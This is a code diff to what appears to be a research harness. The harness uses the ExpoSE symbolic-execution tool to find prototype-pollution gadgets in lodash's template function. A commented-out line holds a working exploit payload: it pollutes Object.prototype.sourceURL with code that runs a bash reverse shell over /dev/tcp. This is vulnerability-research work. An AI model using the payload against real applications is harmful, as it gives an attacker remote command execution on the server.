@@ -11,7 +11,7 @@
 const lodash = require('lodash')
 const fs = require('fs')
 
-var S$ = require('S$')
+var S$ = require('../../../lib/S$')
 
 /**
  * Polluted Payload
@@ -19,7 +19,7 @@ var S$ = require('S$')
 // Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"
 
 // make it symbolic
-Object.prototype.sourceURL = S$.symbol('sourceURL_undef', "")
+Object.prototype.sourceURL = S$.pureSymbol('sourceURL_undef')
 
 /**
  * Exported function call
@@ -27,9 +27,9 @@ Object.prototype.sourceURL = S$.symbol('sourceURL_undef', "")
 fs.readFile('/home/ubuntu/ExpoSE/TemplateEngines/lodash/template.ejs', (err, content) => {
     let compiled = lodash.template(content)
 
-    if(Object._expose._isSymbolic(compiled)){
-        throw "FOUNDAGADGETS!"
-    }
+    // if(Object._expose._isSymbolic(compiled)){
+    //     throw "[+][+]FOUNDAGADGETS!"
+    // }
     // let rendered = compiled({'language': 'python', 'category':'programming'})
 
     // test whether the sink is symbolic
